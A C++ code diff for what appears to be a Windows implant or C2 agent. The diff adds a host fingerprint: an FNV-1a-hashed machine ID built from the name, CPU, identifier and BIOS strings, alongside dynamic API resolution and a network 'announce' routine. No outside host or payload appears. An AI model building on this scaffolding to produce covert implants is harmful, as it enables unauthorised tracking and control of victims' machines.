@@ -1,5 +1,6 @@
 #include <common.h>
 #include <constexpr.h>
+#include <cstddef>
 #include <resolve.h>
 #include "winhttp.h"
 
@@ -15,27 +16,71 @@ extern "C" auto declfn entry(_In_ void *args) -> void {
 
 class Machine {
 public:
+    uint32_t id;
     char name[16];
     char cpu_name[256];
     char identifier[256];
     char bios[256];
-    Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle);
+    Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle);
+    char* get_id(void);
 
 private:
-    uintptr_t ntdll_handle, kernel32_handle;
+    uintptr_t ntdll_handle, kernel32_handle, user32_handle;
     void resolve_name(void);
     void resolve_cpu_name(void);
     void resolve_identifier(void);
     void resolve_bios(void);
+    uint32_t fnv1a_hash(const char* str) const;
+    const uint32_t FNV_prime = 16777619u;
+    const uint32_t FNV_offset_basis = 2166136261u;
+    void compute_id(void);
 };
 
-Machine::Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle) {
+Machine::Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle) {
     this->kernel32_handle = kernel32_handle;
     this->ntdll_handle = ntdll_handle;
+    this->user32_handle = user32_handle;
     this->resolve_name();
     this->resolve_cpu_name();
     this->resolve_identifier();
     this->resolve_bios();
+    this->compute_id();
+}
+
+char* Machine::get_id(void) {
+    decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
+    decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
+    decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
+    if (_wsprintf == NULL || get_process_heap == NULL || rtl_alloc_heap == NULL) {
+        return NULL;
+    }
+    HANDLE heap = get_process_heap();
+    if (heap == NULL) {
+        return NULL;
+    }
+    char* buffer = (char*)rtl_alloc_heap(heap, 0, 12);
+    if (buffer == NULL) {
+        return NULL;
+    }
+    _wsprintf(buffer, "%u", this->id);
+    return buffer;
+}
+
+void Machine::compute_id(void) {
+    uint32_t hash_name = fnv1a_hash(name);
+    uint32_t hash_cpu_name = fnv1a_hash(cpu_name);
+    uint32_t hash_identifier = fnv1a_hash(identifier);
+    uint32_t hash_bios = fnv1a_hash(bios);
+    this->id = hash_name ^ hash_cpu_name ^ hash_identifier ^ hash_bios;
+}
+
+uint32_t Machine::fnv1a_hash(const char* str) const {
+    uint32_t hash = FNV_offset_basis;
+    while (*str) {
+        hash ^= static_cast<uint32_t>(static_cast<unsigned char>(*str++));
+        hash *= FNV_prime;
+    }
+    return hash;
 }
 
 void Machine::resolve_bios(void) {
@@ -114,7 +159,6 @@ Net::Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_han
 
 char* Net::announce(char name[16]) {
 	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
-	// decltype(HeapAlloc) *heap_alloc = RESOLVE_API(this->kernel32_handle, HeapAlloc);
 	decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
 
 	decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
@@ -264,9 +308,10 @@ auto declfn instance::start(_In_ void *arg) -> void {
 
 	Machine machine(
         reinterpret_cast<uintptr_t>(ntdll.handle),
-        reinterpret_cast<uintptr_t>(kernel32.handle)
+        reinterpret_cast<uintptr_t>(kernel32.handle),
+        reinterpret_cast<uintptr_t>(user32)
     );
-	msgbox(nullptr, machine.bios, symbol<const char *>("caption"), MB_OK);
+	msgbox(nullptr, machine.get_id(), symbol<const char *>("caption"), MB_OK);
 
     Net net(
         reinterpret_cast<uintptr_t>(ntdll.handle),
